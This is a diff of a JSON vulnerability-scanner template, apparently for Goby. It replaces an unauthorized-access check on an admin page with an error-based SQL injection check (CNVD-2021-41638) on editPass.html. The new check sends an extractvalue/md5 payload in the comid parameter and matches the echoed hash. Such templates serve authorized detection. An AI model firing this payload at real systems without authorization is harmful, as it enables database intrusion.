@@ -1,9 +1,11 @@
 {
-      "Name": "yuanchuangxianfeng unauthorized access vulnerability",
+      "Name": "ziguang editPass.html SQL injection CNVD-2021-41638",
       "Level": "3",
-      "Tags": [],
+      "Tags": [
+            "sqli"
+      ],
       "GobyQuery": "header=\"Pragma\"",
-      "Description": "原创先锋 后台管理平台 存在未授权访问漏洞，攻击者通过漏洞可以任意接管账户权限",
+      "Description": "",
       "Product": "",
       "Homepage": "https://gobies.org/",
       "Author": "gobysec@gmail.com",
@@ -23,10 +25,10 @@
             {
                   "Request": {
                         "method": "GET",
-                        "uri": "/admin/admin/admin_list.html",
+                        "uri": "/login/Login/editPass.html?comid=extractvalue(1,concat(char(126),md5(1)))",
                         "follow_redirect": true,
                         "header": {
-                              "User-Agent": "Mozilla/5.0(X11; Linux x86_64; rv:12.0) Gecko/20100101 Firefox/12.0"
+                              "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:101.0) Gecko/20100101 Firefox/101.0"
                         },
                         "data_type": "text",
                         "data": "",
@@ -40,14 +42,14 @@
                                     "type": "item",
                                     "variable": "$code",
                                     "operation": "==",
-                                    "value": "200",
+                                    "value": "404",
                                     "bz": ""
                               },
                               {
                                     "type": "item",
                                     "variable": "$body",
                                     "operation": "contains",
-                                    "value": "admin",
+                                    "value": "c4ca4238a0b923820dcc509a6f75849",
                                     "bz": ""
                               }
                         ]
@@ -62,10 +64,10 @@
             {
                   "Request": {
                         "method": "GET",
-                        "uri": "/admin/admin/admin_list.html",
+                        "uri": "/login/Login/editPass.html?comid=extractvalue(1,concat(char(126),md5(1)))",
                         "follow_redirect": true,
                         "header": {
-                              "User-Agent": "Mozilla/5.0(X11; Linux x86_64; rv:12.0) Gecko/20100101 Firefox/12.0"
+                              "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:101.0) Gecko/20100101 Firefox/101.0"
                         },
                         "data_type": "text",
                         "data": "",
@@ -79,14 +81,14 @@
                                     "type": "item",
                                     "variable": "$code",
                                     "operation": "==",
-                                    "value": "200",
+                                    "value": "404",
                                     "bz": ""
                               },
                               {
                                     "type": "item",
                                     "variable": "$body",
                                     "operation": "contains",
-                                    "value": "admin",
+                                    "value": "c4ca4238a0b923820dcc509a6f75849",
                                     "bz": ""
                               }
                         ]
@@ -96,6 +98,6 @@
                   ]
             }
       ],
-      "PostTime": "2022-06-05 21:56:23",
-      "GobyVersion": "1.9.325"
+      "PostTime": "2022-06-24 00:41:55",
+      "GobyVersion": "1.9.323"
 }
